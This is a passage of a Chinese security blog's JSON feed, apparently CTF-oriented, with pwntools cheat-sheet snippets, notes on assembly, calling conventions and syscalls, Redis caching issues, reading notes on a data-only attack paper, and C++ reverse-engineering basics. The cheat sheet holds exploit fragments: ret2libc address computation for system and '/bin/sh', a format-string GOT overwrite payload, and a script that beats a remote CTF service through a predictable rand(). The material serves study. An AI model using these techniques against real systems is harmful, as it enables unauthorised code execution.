设置当前程序运行的上下文，如果是32位则这里设置为i386即可</span><br>c.interactive() <span class=\"hljs-comment\"># 开始进行交互</span><br><br><span class=\"hljs-comment\"># 不想去手动搞地址可以用pwntools帮忙搞</span><br>e = ELF(<span class=\"hljs-string\">'./example_file'</span>)<br><span class=\"hljs-built_in\">print</span> <span class=\"hljs-built_in\">hex</span>(e.address)  <span class=\"hljs-comment\"># 0x400000</span><br><span class=\"hljs-built_in\">print</span> <span class=\"hljs-built_in\">hex</span>(e.symbols[<span class=\"hljs-string\">'write'</span>]) <span class=\"hljs-comment\"># 0x401680</span><br><span class=\"hljs-built_in\">print</span> <span class=\"hljs-built_in\">hex</span>(e.got[<span class=\"hljs-string\">'write'</span>]) <span class=\"hljs-comment\"># 输出got地址,为什么还没有运行就能知道got地址？这里其实是got表的地址，该地址的内容指向实际加载的地址</span><br><span class=\"hljs-built_in\">print</span> <span class=\"hljs-built_in\">hex</span>(e.plt[<span class=\"hljs-string\">'write'</span>]) <span class=\"hljs-comment\"># 输出plt地址，该内容中存储的是指向got地址</span><br>offset = e.symbols[<span class=\"hljs-string\">'system'</span>] - e.symbols[<span class=\"hljs-string\">'printf'</span>] <span class=\"hljs-comment\"># calculate offset</span><br>binsh_address = <span class=\"hljs-built_in\">next</span>(e.search(<span class=\"hljs-string\">'/bin/sh\\x00'</span>)) <span class=\"hljs-comment\"># find address which contains /bin/sh</span><br><br><span class=\"hljs-comment\"># 注意这里有个技巧，获取程序的输出</span><br>p.recvuntil(<span class=\"hljs-string\">\"secret[1] is\"</span>) <span class=\"hljs-comment\"># 这里有个技巧</span><br>v3_addr = <span class=\"hljs-built_in\">int</span>(p.recv(<span class=\"hljs-number\">7</span>),<span class=\"hljs-number\">16</span>)<br><br><span class=\"hljs-string\">'''</span><br><span class=\"hljs-string\">\t使用给定的libc</span><br><span class=\"hljs-string\">'''</span><br>libc = ELF(<span class=\"hljs-string\">\"./libc_32.so.6\"</span>)<br>libc_write = libc.symbols[<span class=\"hljs-string\">\"write\"</span>]<br>libc_system = libc.symbols[<span class=\"hljs-string\">\"system\"</span>]<br>libc_bin_sh = <span class=\"hljs-built_in\">next</span>(libc.search(<span class=\"hljs-string\">b\"/bin/sh\\x00\"</span>))<br>write_got=u32(sh.recv(<span class=\"hljs-number\">4</span>)) <span class=\"hljs-comment\"># 使用泄露出来的地址</span><br><span class=\"hljs-comment\">#生成格式化字符串漏洞利用脚本</span><br>payload = fmtstr_payload(<span class=\"hljs-number\">6</span>,{printf_got:sys_plt}) <span class=\"hljs-comment\"># 第一个参数是字符串的存储位置也就是这个AAAA</span><br><br>ROPgadget --binary ret2libc3  --only <span class=\"hljs-string\">'pop|ret'</span><br>ROPgadget --binary 文件名 --sting <span class=\"hljs-string\">'/bin/sh'</span><br><br><span class=\"hljs-string\">'''</span><br><span class=\"hljs-string\">\t利用python调用libc中的函数</span><br><span class=\"hljs-string\">'''</span><br><span class=\"hljs-comment\"># 使用python调用libc中的函数</span><br><span class=\"hljs-keyword\">from</span> ctypes <span class=\"hljs-keyword\">import</span> *<br>io = remote(<span class=\"hljs-string\">'220.249.52.133'</span>, <span class=\"hljs-number\">54835</span>)<br> <span class=\"hljs-comment\"># 加载C动态链接库</span><br>libc = cdll.LoadLibrary(<span class=\"hljs-string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)<br><span class=\"hljs-comment\"># 调用函数库中的内容</span><br>libc.srand(<span class=\"hljs-number\">1</span>)<br><span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">10</span>):<br>    num = <span class=\"hljs-built_in\">str</span>(libc.rand()%<span class=\"hljs-number\">6</span>+<span class=\"hljs-number\">1</span>)<br>    io.recvuntil(<span class=\"hljs-string\">'number:'</span>)<br>    io.sendline(num)<br>io.interactive()<br><span class=\"hljs-string\">'''</span><br><span class=\"hljs-string\">\t无libc文件的时候怎么打ret2libc</span><br><span class=\"hljs-string\">'''</span><br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br>libc= LibcSearcher(<span class=\"hljs-string\">\"read\"</span>,read_libc) <span class=\"hljs-comment\"># 这里泄露read函数地址，这里其实任何一个函数都可以，只要名称对应上即可</span><br>libc_base=read_libc-libc.dump(<span class=\"hljs-string\">'read'</span>) <span class=\"hljs-comment\"># 这里是重定位后的地址减去在libc中的地址，得到基地址</span><br><br>system_addr=p64(libc_base+libc.dump(<span class=\"hljs-string\">'system'</span>)) <span class=\"hljs-comment\"># 这里得到的是system函数的地址</span><br>binsh_addr = p64(libc.dump(<span class=\"hljs-string\">\"str_bin_sh\"</span>) + libc_base) <span class=\"hljs-comment\"># 这里找到binsh的地址</span><br><br><br><span class=\"hljs-string\">'''</span><br><span class=\"hljs-string\">\t求解多元方程组</span><br><span class=\"hljs-string\">'''</span><br><span class=\"hljs-keyword\">from</span> z3 <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-comment\"># 这里声明变量</span><br>a = Int(<span class=\"hljs-string\">'a'</span>)<br>b = Int(<span class=\"hljs-string\">'b'</span>)<br><span class=\"hljs-comment\"># 创建求解器</span><br>s = Solver()<br><span class=\"hljs-comment\"># 添加约束条件</span><br>s.add(c * b * a - d == <span class=\"hljs-number\">36182</span>)<br>s.add(a==<span class=\"hljs-number\">19</span>)<br><span class=\"hljs-built_in\">print</span>(s.check())<br><span class=\"hljs-built_in\">print</span>(s.model())<br></code></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"容易忘的汇编指令\"><a href=\"#容易忘的汇编指令\" class=\"headerlink\" title=\"容易忘的汇编指令\"></a>容易忘的汇编指令</h2><figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asm\">leave: <br>\tmov esp, ebp;<br>    pop ebp;<br>test eax, eax ; 目的在于将eax进行与运算，**其实本质上来讲就是来检查是不是0**，在程序中经常出现<br></code></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"三种函数调用约定\"><a href=\"#三种函数调用约定\" class=\"headerlink\" title=\"三种函数调用约定\"></a>三种函数调用约定</h2><ul>\n<li>调用约定的本质是定义函数的参数传递方式，函数的返回值，以及调用后如何返回三项基本内容</li>\n<li>三种调用约定<ul>\n<li>__cdecl是C/C++的默认调用方式<ul>\n<li>参数使用栈传递，按照顺序从右向左依次进行入栈，主函数负责栈平衡（<strong>也就是谁调用谁负责栈平衡</strong>）</li>\n<li>命名方式为下划线加上函数名</li>\n<li>Linux下的主要传参方式<ul>\n<li>X86:普通函数直接全都放在栈上传参（从右向左的方式），syscall则是使用 eax当做调用号，ebx,ecx，edx，esi,edi,ebp传入</li>\n<li>X64: 普通函数传参使用的是rdi,rsi,rdx,rcx,r8,r9 syscall系统调用则是使用rax作为系统调用号，其余与普通函数类似</li>\n<li>arm：r0,1,2,3</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>__stdcall是Windows API函数的调用方式<ul>\n<li>参数从右向左依次进行入栈，被调用的函数负责栈平衡。</li>\n</ul>\n</li>\n<li>__fastcall 对性能要求比较高的时候往往使用该方式<ul>\n<li>该方式优先使用寄存器（ECX、EDX）和栈传参，剩下的参数再使用栈从右向左传递，<strong>栈平衡由被调用的函数负责</strong></li>\n<li>快速调用方式使用中的命名规则为@加上函数名@参数大小</li>\n</ul>\n</li>\n<li>__thiscall 函数调用方式</li>\n<li>CS都是从右向左入栈调用，fastcall则是优先使用ecx，edx，其余参数从右向左入栈</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"寄存器\"><a href=\"#寄存器\" class=\"headerlink\" title=\"寄存器\"></a>寄存器</h2><h3 id=\"flags寄存器有哪些位，有什么作用\"><a href=\"#flags寄存器有哪些位，有什么作用\" class=\"headerlink\" title=\"flags寄存器有哪些位，有什么作用\"></a>flags寄存器有哪些位，有什么作用</h3><p><a href=\"https://zhuanlan.zhihu.com/p/272135463?utm_id=0\">https://zhuanlan.zhihu.com/p/272135463?utm_id=0</a></p>\n<ul>\n<li><a href=\"https://blog.csdn.net/weixin_38633659/article/details/125192247#1CF0_59\">1、CF（0）：进位标志位</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_38633659/article/details/125192247#2PF2_65\">2、PF（2）：奇偶标志位</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_38633659/article/details/125192247#3AF4_70\">3、AF（4）：辅助进位标志</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_38633659/article/details/125192247#4ZF60_75\">4、ZF（6）：0标志位</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_38633659/article/details/125192247#5SF7_81\">5、SF（7）：符号标志位</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_38633659/article/details/125192247#6TF8_87\">6、TF（8）：追踪标志</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_38633659/article/details/125192247#7IF9_90\">7、IF（9）：中断标志位</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_38633659/article/details/125192247#8DF10_93\">8、DF（10）：方向标志位</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_38633659/article/details/125192247#9OF11_98\">9、OF（11）：溢出标志位</a></li>\n</ul>\n<h3 id=\"控制寄存器有哪些\"><a href=\"#控制寄存器有哪些\" class=\"headerlink\" title=\"控制寄存器有哪些\"></a>控制寄存器有哪些</h3><ol>\n<li>CR0：含有控制处理器操作模式和状态的系统控制标识，它分为两种，一种是协处理器控制位，一种是保护控制位。协处理器控制位包括扩展类型位 ET、任务切换位 TS、仿真位 EM 和数学存在位 MP，用于控制 x86 的浮点，也就是数学协处理器的操作。1</li>\n<li>CR1：保留。2</li>\n<li>CR2：当CPU访问某个无效页面时，会产生缺页异常，此时，CPU会引起异常的线性地址存放在CR2中。</li>\n<li>CR3：页目录基地址寄存器，用来切换和定位当前正在使用的页表。</li>\n<li>CR4：含有与分页机制相关的系统控制标识，包括 PAE 和 PSE 位，用于控制分页的配置。</li>\n</ol>\n<p>以上寄存器都是 32 位的，各自的作用是与分页机制密切相关，因此，在进程管理及虚拟内存管理中会涉及到这几个寄存器。对控制寄存器的读写是通过 mov 指令来实现</p>\n<h2 id=\"系统函数的调用方式\"><a href=\"#系统函数的调用方式\" class=\"headerlink\" title=\"系统函数的调用方式\"></a>系统函数的调用方式</h2><h3 id=\"32位下的系统函数调用\"><a href=\"#32位下的系统函数调用\" class=\"headerlink\" title=\"32位下的系统函数调用\"></a>32位下的系统函数调用</h3><ul>\n<li><p>传参方式：首先将系统调用号传入eax，然后将参数从左到右依次存入ebx、ecx、edx寄存器中，返回值存在eax寄存器中。</p>\n</li>\n<li><p>调用号：</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\">sys_read = <span class=\"hljs-number\">3</span><br>sys_write = <span class=\"hljs-number\">4</span><br>sys_execve = <span class=\"hljs-number\">11</span><br></code></pre></td></tr></tbody></table></figure>\n</li>\n<li><p>使用int 80h中断进行系统调用</p>\n</li>\n<li><p>32位程序编译</p>\n</li>\n<li><pre><code class=\"sh\">gcc -m32 -o  testAlign32  testAlign.c\n# 如果出现报错/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h: 没有那个文件或目录    27 | #include &lt;bits/libc-header-start.h&gt;，则使用以下指令\nsudo apt-get install gcc-multilib\n</code></pre>\n</li>\n</ul>\n<h3 id=\"64位下的系统函数调用\"><a href=\"#64位下的系统函数调用\" class=\"headerlink\" title=\"64位下的系统函数调用\"></a>64位下的系统函数调用</h3><ul>\n<li>首先将系统调用号传入rax，然后将参数从左到右依次存入rdi、rsi、rdx寄存器中，返回值存在rax寄存器中</li>\n<li>调用号：sys_read为0，sys_write为1，sys_open为2</li>\n<li>调用方式：使用syscall指令进行系统调用</li>\n</ul>\n<h2 id=\"linux下程序的加载过程\"><a href=\"#linux下程序的加载过程\" class=\"headerlink\" title=\"linux下程序的加载过程\"></a>linux下程序的加载过程</h2><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202404081706670.png\" alt=\"image-20230316183408668\"></p>\n",
            "tags": [
                "二进制安全"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2024/04/08/er-jin-zhi-xuan-shou-de-web-jiu-shu/",
            "url": "https://alazymechnaic.github.io/2024/04/08/er-jin-zhi-xuan-shou-de-web-jiu-shu/",
            "title": "二进制选手のWEB救赎",
            "date_published": "2024-04-08T02:33:41.000Z",
            "content_html": "<h2 id=\"语言类型漏洞\"><a href=\"#语言类型漏洞\" class=\"headerlink\" title=\"语言类型漏洞\"></a>语言类型漏洞</h2><h3 id=\"JAVA\"><a href=\"#JAVA\" class=\"headerlink\" title=\"JAVA\"></a>JAVA</h3><h4 id=\"反序列化\"><a href=\"#反序列化\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h4><h4 id=\"内存马\"><a href=\"#内存马\" class=\"headerlink\" title=\"内存马\"></a>内存马</h4><h4 id=\"jndi注入\"><a href=\"#jndi注入\" class=\"headerlink\" title=\"jndi注入\"></a>jndi注入</h4><h4 id=\"springboot\"><a href=\"#springboot\" class=\"headerlink\" title=\"springboot\"></a>springboot</h4><h2 id=\"中间件相关问题\"><a href=\"#中间件相关问题\" class=\"headerlink\" title=\"中间件相关问题\"></a>中间件相关问题</h2><h3 id=\"Nginx\"><a href=\"#Nginx\" class=\"headerlink\" title=\"Nginx\"></a>Nginx</h3><h3 id=\"Redis缓存穿透、缓存雪崩、缓存击穿问题\"><a href=\"#Redis缓存穿透、缓存雪崩、缓存击穿问题\" class=\"headerlink\" title=\"Redis缓存穿透、缓存雪崩、缓存击穿问题\"></a>Redis缓存穿透、缓存雪崩、缓存击穿问题</h3><p>参考链接：<a href=\"https://blog.csdn.net/weixin_43888891/article/details/131397044\">https://blog.csdn.net/weixin_43888891/article/details/131397044</a></p>\n<p>在实际的业务场景中，Redis 一般和其他数据库搭配使用，用来减轻后端数据库的压力，比如和关系型数据库 MySQL 配合使用。Redis 会把 MySQL 中经常被查询的数据缓存起来，比如热点数据，这样当用户来访问的时候，就不需要到 MySQL 中去查询了，而是直接获取 Redis 中的缓存数据，从而降低了后端数据库的读取压力。如果说用户查询的数据 Redis 没有，此时用户的查询请求就会转到 MySQL 数据库，当 MySQL 将数据返回给客户端时，同时会将数据缓存到 Redis 中，这样用户再次读取时，就可以直接从 Redis 中获取数据。Redis相当于MySQL的缓存，二者互为内存与磁盘的关系。</p>\n<h4 id=\"缓存穿透\"><a href=\"#缓存穿透\" class=\"headerlink\" title=\"缓存穿透\"></a>缓存穿透</h4><p>​\tRedis中没有，MySQL中也没有。不断有请求穿过Redis到达MySQL，导致MySQL返回一个空对象。如果查询次数非常多就会造成MySQL压力过大，直到崩溃。</p>\n<p>​\t解决方案： </p>\n<ul>\n<li>在Redis中缓存空对象，但这种操作会占用Redis缓存空间</li>\n<li>业务前端逻辑验证。在业务请求入口对输入的数据做逻辑检查。</li>\n<li>用户黑名单限制：发生异常情况时，实时监控访问的对象和数据，分析用户行为，针对故意请求、爬虫或攻击者，进行特定用户的限制；</li>\n</ul>\n<h4 id=\"缓存击穿\"><a href=\"#缓存击穿\" class=\"headerlink\" title=\"缓存击穿\"></a>缓存击穿</h4><p>Redis中不存在该数据，但MySQL中存在该数据。某个热点数据在Redis中突然过期，导致大量请求涌入到MySQL中。</p>\n<p>解决方法：</p>\n<ul>\n<li>设置热点数据永不过期。</li>\n<li>分布式锁：第一个获取锁的进程进入后端数据查询后，其他进程就没必要再去查询，而是等待Redis中的结果即可。</li>\n</ul>\n<h4 id=\"缓存雪崩\"><a href=\"#缓存雪崩\" class=\"headerlink\" title=\"缓存雪崩\"></a>缓存雪崩</h4><p>​\t某一批热点数据同时过期，或者缓存服务故障。出现大量数据涌入到MySQL中。</p>\n<p>解决方法：</p>\n<ul>\n<li>构建多级缓存架构： nginx缓存 + redis缓存 +其他缓存（ehcache等）</li>\n<li>使用锁或队列： 用加锁或者队列的方式保证来保证不会有大量的线程对数据库一次性进行读写，从而避免失效时大量的并发请求落到底层存储系统上。不适用高并发情况</li>\n<li>设置过期标志更新缓存： 记录缓存数据是否过期（设置提前量），如果过期会触发通知另外的线程在后台去更新实际key的缓存。</li>\n<li>将缓存失效时间分散开： 比如我们可以在原有的失效时间基础上增加一个随机值，比如1-5分钟随机，这样每一个缓存的过期时间的重复率就会降低，就很难引发集体失效的事件。</li>\n<li>不设置过期时间： 热点数据可以考虑不失效，后台异步更新缓存，适用于不严格要求缓存一致性的场景。<br>双key策略：主key设置过期时间，备key不设置过期时间，当主key失效时，直接返回备key值。</li>\n</ul>\n<h2 id=\"泛Web安全技术\"><a href=\"#泛Web安全技术\" class=\"headerlink\" title=\"泛Web安全技术\"></a>泛Web安全技术</h2><h3 id=\"虚拟机逃逸相关\"><a href=\"#虚拟机逃逸相关\" class=\"headerlink\" title=\"虚拟机逃逸相关\"></a>虚拟机逃逸相关</h3><h3 id=\"病毒免杀\"><a href=\"#病毒免杀\" class=\"headerlink\" title=\"病毒免杀\"></a>病毒免杀</h3><h2 id=\"安全工具相关\"><a href=\"#安全工具相关\" class=\"headerlink\" title=\"安全工具相关\"></a>安全工具相关</h2><h3 id=\"Burpsuite\"><a href=\"#Burpsuite\" class=\"headerlink\" title=\"Burpsuite\"></a>Burpsuite</h3><h3 id=\"nmap\"><a href=\"#nmap\" class=\"headerlink\" title=\"nmap\"></a>nmap</h3><h3 id=\"sqlmap\"><a href=\"#sqlmap\" class=\"headerlink\" title=\"sqlmap\"></a>sqlmap</h3><h4 id=\"sqlmap源码的阅读\"><a href=\"#sqlmap源码的阅读\" class=\"headerlink\" title=\"sqlmap源码的阅读\"></a>sqlmap源码的阅读</h4><h3 id=\"awvs\"><a href=\"#awvs\" class=\"headerlink\" title=\"awvs\"></a>awvs</h3><h3 id=\"蚁剑-amp-冰蝎\"><a href=\"#蚁剑-amp-冰蝎\" class=\"headerlink\" title=\"蚁剑 &amp; 冰蝎\"></a>蚁剑 &amp; 冰蝎</h3><h3 id=\"dirsearch\"><a href=\"#dirsearch\" class=\"headerlink\" title=\"dirsearch\"></a>dirsearch</h3><h2 id=\"场景题目\"><a href=\"#场景题目\" class=\"headerlink\" title=\"场景题目\"></a>场景题目</h2><h4 id=\"曾经挖掘过什么漏洞\"><a href=\"#曾经挖掘过什么漏洞\" class=\"headerlink\" title=\"曾经挖掘过什么漏洞\"></a>曾经挖掘过什么漏洞</h4><p>​\t原本是一个横向越权，后来扫描C段的时候发现了另一个界面，是很早之前的一个参会登记页面，然后存在一个可以填写的表单，能够进行二次注入。</p>\n",
            "tags": [
                "web"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2024/04/02/lun-wen-yue-du-bi-ji-practical-data-only-attack-generation/",
            "url": "https://alazymechnaic.github.io/2024/04/02/lun-wen-yue-du-bi-ji-practical-data-only-attack-generation/",
            "title": "论文阅读笔记：Practical Data-Only Attack Generation",
            "date_published": "2024-04-02T12:40:27.000Z",
            "content_html": "<h1 id=\"Practical-Data-Only-Attack-Generation\"><a href=\"#Practical-Data-Only-Attack-Generation\" class=\"headerlink\" title=\"Practical Data-Only Attack Generation\"></a>Practical Data-Only Attack Generation</h1><hr>\n<h2 id=\"摘要\"><a href=\"#摘要\" class=\"headerlink\" title=\"摘要\"></a>摘要</h2><h3 id=\"主体思路：\"><a href=\"#主体思路：\" class=\"headerlink\" title=\"主体思路：\"></a>主体思路：</h3><p>​\t抽象不必要的复杂性，使用轻量级的方案解决最优希望的漏洞（意思是最简单的DOP漏洞？</p>\n<h3 id=\"设计框架EINSTEIN\"><a href=\"#设计框架EINSTEIN\" class=\"headerlink\" title=\"设计框架EINSTEIN:\"></a>设计框架EINSTEIN:</h3><ul>\n<li>扫描系统调用并将其串联成一个攻击链。</li>\n<li>基于unmodified attacker data（这里暂时理解为POC）作为输入</li>\n</ul>\n<h2 id=\"对DOP的理解\"><a href=\"#对DOP的理解\" class=\"headerlink\" title=\"对DOP的理解\"></a>对DOP的理解</h2><p>现有的解决方案通常使用符号执行，简化假设<strong>（即便是这个假设并不符合攻击目标）</strong>，手动构建gadget链的方法。现有的方法虽然并不破坏控制数据，但是破坏了一些<strong>control-adjacent data</strong>,(这里理解为和控制数据差不多的branch condition的数据)，实现所谓的合法路径，其实还是在以最小攻击面上劫持控制流，这就导致使用重量级的分析会导致大量复杂的约束。</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202404022113797.png\" alt=\"image-20240402211350712\"></p>\n<p><strong>在现实中，对于一个足够复杂的程序，要在有限的时间内解决所有约束条件是极其困难，甚至是不可能的。问题空间——即覆盖任何可能的数据到任何可能的值，在任何可能的程序点使用它，以实现任意计算——太大了</strong></p>\n<p>现有工作的困境：</p>\n<p>（1）攻击只能覆盖特定的内存部分</p>\n<p>（2）攻击者必须使用另一个漏洞来到达gadget的入口点</p>\n<p>（3）攻击者必须手动将gadget链接在一起构建利用代码。</p>\n<p>​\t这些做法简化了问题，但是它们要么极大地限制了生成的利用代码的范围，要么将其中的一部分留给未来或手动工作。简而言之，这些方法的整体复杂性阻止上了上图中所有目标的实现。</p>\n<h2 id=\"轻量级方法\"><a href=\"#轻量级方法\" class=\"headerlink\" title=\"轻量级方法\"></a>轻量级方法</h2><h3 id=\"设计原则\"><a href=\"#设计原则\" class=\"headerlink\" title=\"设计原则\"></a>设计原则</h3><ul>\n<li>动态污点分析削减了仅数据攻击复杂的约束。使用具体执行来确定一些数据，而不是推算一些数据。（这不还是实例化吗）</li>\n<li>图灵完备性是不必要的部分，没有必要去追求图灵完备才实现攻击。</li>\n<li>操纵目标程序的路径是不必要的，程序不需要攻击者的干预就能执行execve等敏感函数（这只有nginx可以吧？</li>\n<li>在程序初始化后，许多数据被视为是不可变的，因此这些数据的约束量很少，因为程序原本的逻辑都不会操纵它。那么这些数据就可以在一开始调用原语破坏掉，其数据一致性自然保证。（这是啥，nginx oriented programming</li>\n</ul>\n<h3 id=\"框架实现\"><a href=\"#框架实现\" class=\"headerlink\" title=\"框架实现\"></a>框架实现</h3><ul>\n<li>使用动态污点分析，标记攻击者可污染的部分还是人工指定的。</li>\n<li>如果动态污点分析结果表明syscall用了污染的数据，就认为这个syscall可以被控制，如果两个syscall都用了就说明这俩能缝合？</li>\n</ul>\n<h3 id=\"Contribution\"><a href=\"#Contribution\" class=\"headerlink\" title=\"Contribution\"></a>Contribution</h3><ul>\n<li>发表了一个在复杂程序上构建仅数据攻击的实用方法</li>\n<li>开发了EINSTEIN</li>\n<li>使用EINSTEIN找到了数千个未知的系统调用，并在nginx上构造了数百个exploits</li>\n</ul>\n<h3 id=\"Threat-Model\"><a href=\"#Threat-Model\" class=\"headerlink\" title=\"Threat Model\"></a>Threat Model</h3><p>​\t与先前的研究类似，将所有的保护措施都保持开启，并且开启shadow stack等所有严格的栈保护措施。此外还包括：</p>\n<ul>\n<li>能够访问与攻击目标等效的二进制程序（不直接说能够获得目标二进制</li>\n<li>能够与目标服务正常地交互</li>\n<li>能够通过信息泄露bypass ASLR（意思就是说可以忽略ASLR了？之前说的开启保护不是扯扯淡</li>\n<li>能够在程序的静止状态获取一个任意写原语（意思是还得有个任意写原语来修改内存</li>\n</ul>\n<h3 id=\"DESIGN\"><a href=\"#DESIGN\" class=\"headerlink\" title=\"DESIGN\"></a>DESIGN</h3><h4 id=\"执行步骤\"><a href=\"#执行步骤\" class=\"headerlink\" title=\"执行步骤\"></a>执行步骤</h4><ol>\n<li><strong>框架从程序的静息状态开始接手</strong>：例如nginx等待链接请求时的状态开始，这个时候所有的变量初始化都基本完成。</li>\n<li><strong>模拟一个任意内存写入的原语</strong>：手动引入一个任意内存写入漏洞完成对所有可控数据的污染标记（这不还是标记所有的内存？）</li>\n<li><strong>发送正常的用户输入</strong>：向目标程序中发送标准输入，记录污染能够传播到syscall。</li>\n<li><strong>记录受污染情况</strong>：如果syscall 的变量可被污染，就证明该变量可用，将其作为候选的gadget，并且它还记录了有关系统调用的信息，例如其参数及其是否受到污点的影响。（这不就是一般的污点分析做的事情吗</li>\n<li>、<strong>生成Exploit</strong>：检查受污染参数和之前标记的污染变量的范围，发现参数和预先标记的内存是完全相同的（<strong>这咋发现的，只能知道影不影响，又不能知道是不是一样</strong>），将这种直接的数据流称为身份数据流，EINSTEIN通过生成(addr, val)对来构建一个候选利用代码，以将目标数据从”/usr/local/server/cgi-bin”更改为”/bin”（这种情况太少了吧</li>\n<li><strong>Exploit验证</strong>：利用键值对修改内存，然后发送数据包执行</li>\n</ol>\n<h4 id=\"污点分析引擎\"><a href=\"#污点分析引擎\" class=\"headerlink\" title=\"污点分析引擎\"></a>污点分析引擎</h4><p>污点分析引擎设计需要满足下面两个目标：</p>\n<ul>\n<li>能够标记足够大的范围</li>\n<li>要求使用一个成本较低的污点分析？</li>\n</ul>\n<h4 id=\"污点分析策略\"><a href=\"#污点分析策略\" class=\"headerlink\" title=\"污点分析策略\"></a>污点分析策略</h4><ul>\n<li>只污染具有长期保存的内存部分，也就自然排除了栈段（作者PS:如果想要污染栈上的长期变量也可以）</li>\n<li>指针处理策略：将受污染的指针索引得到的任何内容都视为被污染的（我们也做了，甚至还做了内存搜索</li>\n<li>系统调用缝合，一个系统调用可以创建一个文件指针FD，另一个系统调用使用了这个文件指针，那么这两个系统调用就实现了缝合<ul>\n<li>Directly 缝合：直接污染的syscall</li>\n<li>In-Directly 缝合：一个受污染的syscall的结果被另一个syscall使用</li>\n</ul>\n</li>\n<li>分析践行轻量级：只找那些从snapshot开始不变的量，如果到syscal之后还是不变就表明污染是一致的没有断掉</li>\n<li>所以exploit求解其实还是求出的snapshot状态下的（addr，val）键值对。</li>\n<li><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20240404233058728.png\" alt=\"image-20240404233058728\"></li>\n<li>exploit键值对的验证方法：重新运行程序，依照键值对设置内存，发送workload（这里为什么不叫payload就是因为这个东西并不触发攻击，所以这里才给他叫做workload）</li>\n</ul>\n",
            "tags": [
                "paper"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/27/windows-pwn-ru-men/",
            "url": "https://alazymechnaic.github.io/2024/03/27/windows-pwn-ru-men/",
            "title": "Windows PWN入门",
            "date_published": "2024-03-27T07:24:59.000Z",
            "content_html": "<p><a href=\"https://sky123.blog.csdn.net/article/details/131312600#comments_29465036\">https://sky123.blog.csdn.net/article/details/131312600#comments_29465036</a></p>\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/26/c-ni-xiang-fen-xi/",
            "url": "https://alazymechnaic.github.io/2024/03/26/c-ni-xiang-fen-xi/",
            "title": "",
            "date_published": "2024-03-26T06:50:04.317Z",
            "content_html": "<h1 id=\"C-逆向分析\"><a href=\"#C-逆向分析\" class=\"headerlink\" title=\"C++逆向分析\"></a>C++逆向分析</h1><hr>\n<h2 id=\"写在前面\"><a href=\"#写在前面\" class=\"headerlink\" title=\"写在前面\"></a>写在前面</h2><p>在现在这个时代，似乎针对C的编程已经过时了。面向对象才是唯一的出路，安全专业的学生也不能一直抓着C的逆向不放了。是时候突破自己的舒适区了。生活就是条狗，你不抽它，它就要咬你了。</p>\n<h2 id=\"C-基础概念\"><a href=\"#C-基础概念\" class=\"headerlink\" title=\"C++ 基础概念\"></a>C++ 基础概念</h2><h3 id=\"C-中的new和delete与C中的malloc和free\"><a href=\"#C-中的new和delete与C中的malloc和free\" class=\"headerlink\" title=\"C++ 中的new和delete与C中的malloc和free\"></a>C++ 中的new和delete与C中的malloc和free</h3><p>new和delete其实本质就是对malloc和free的又一层封装，本质上没有区别。只不过在new时不但会malloc内存，还会自动调用相应的构造函数，而delete也会调用相应的析构函数。</p>\n<p>这里需要注意的一点是，在delete[]和new[]的过程中如何知道要调用几次构造函数和析构函数的？</p>\n<ul>\n<li>在new[n]时会根据n的值来执行相应的构造函数，执行n次，并且会在数组最后多申请一个CPU位数大小的内容来保存调用了几次，那么在delete的时候就可以调用相应次数的析构函数。</li>\n</ul>\n<h3 id=\"C-中的class与C中的struct的区别\"><a href=\"#C-中的class与C中的struct的区别\" class=\"headerlink\" title=\"C++中的class与C中的struct的区别\"></a>C++中的class与C中的struct的区别</h3><ol>\n<li>C中结构体不能有成员函数，而C++中可以</li>\n<li>C结构体不能在结构体中初始化成员变量，而C++结构体可以</li>\n<li>C结构体的空结构体sizeof为0，C++的sizeof为1。</li>\n<li>C、C++语言要求空结构体的实例在内存中具有不同的地址，但是C++另外还要求空结构体的地址是唯一的，即使结构体没有任何成员，也得给他分一个字节来让其占据一个内存地址</li>\n<li>C结构体只有public一种权限，而C++结构体有public、private、protect三种修饰符</li>\n<li>C结构体在定义时除非使用typedef，否则之后定义变量都必须跟上struct + 结构体名，而C++结构体可以直接使用结构体名，不需要加struct</li>\n<li>struct可以在栈中存储，但是class一般在堆中进行存储。</li>\n</ol>\n<h3 id=\"C-中的try-catch机制是如何实现的\"><a href=\"#C-中的try-catch机制是如何实现的\" class=\"headerlink\" title=\"C ++ 中的try-catch机制是如何实现的\"></a>C ++ 中的try-catch机制是如何实现的</h3><ul>\n<li>Windows中的try-catch是对SEH做了一层封装 <a href=\"https://blog.csdn.net/qq_42692132/article/details/132550158\">https://blog.csdn.net/qq_42692132/article/details/132550158</a></li>\n<li><a 